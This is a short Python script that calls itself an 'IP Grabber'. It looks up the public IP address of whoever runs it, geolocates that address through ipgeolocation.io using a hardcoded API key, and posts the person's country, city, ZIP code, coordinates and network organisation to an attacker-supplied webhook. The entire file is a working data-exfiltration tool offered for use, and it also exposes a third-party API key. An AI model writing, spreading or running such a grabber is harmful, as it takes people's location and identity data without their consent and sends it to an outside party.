from requests import get, post
from json import loads, dumps
 

lien = "WEBHOOK HERE"


ip = get("https://v4.ident.me/").text
info = loads(get(f"https://api.ipgeolocation.io/ipgeo?apiKey=ea51e6ee9beb47cdad50bec7ab6579d6&ip={ip}").text)

liste = []

for element in info:
        liste.append(element)





headers = {
    "Content-Type" : "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
}



embed = {
        "username": "IP Grabber by sp33k ",
        "avatar_url": "https://zupimages.net/viewer.php?id=21/23/qqh5.gif",
        "embeds": [
    {
      "title": "My Github",
      "url": "https://github.com/Sp33k",
      "color": 0x0c0303,
      "fields": [
        {"name": "IP :", "value": info[liste[0]]},
        {"name": "Continent :","value": info[liste[2]],"inline" : True,},
        {"name": "Pays : ","value": info[liste[5]],"inline" : True,},
        {"name": "Ville :","value": info[liste[9]],"inline" : True,},
        {"name": "Code ZIP :","value": info[liste[10]],"inline" : True,},
        {"name": "Latitude :","value": info[liste[11]],"inline" : True,},
        {"name": "Longitude :","value": info[liste[12]],"inline" : True,},
        {"name": "Téléphone :","value": info[liste[14]],"inline" : True,},
        {"name": "Organisation :","value": info[liste[19]],"inline" : True,},
      
      
      
      ],
      "author": {
        "name": "tactic4ll",
        "url": "https://github.com/tactic4ll",
        "icon_url": "https://zupimages.net/viewer.php?id=21/23/qqh5.gif"
      
      
      },
      "footer": {
        "text": "IP Grabber tactic4ll"
      },
      "image": {
          "url" : info[liste[17]]
      }
    }
  ]
}

post(lien, data=dumps(embed).encode("utf-8"), headers=headers)
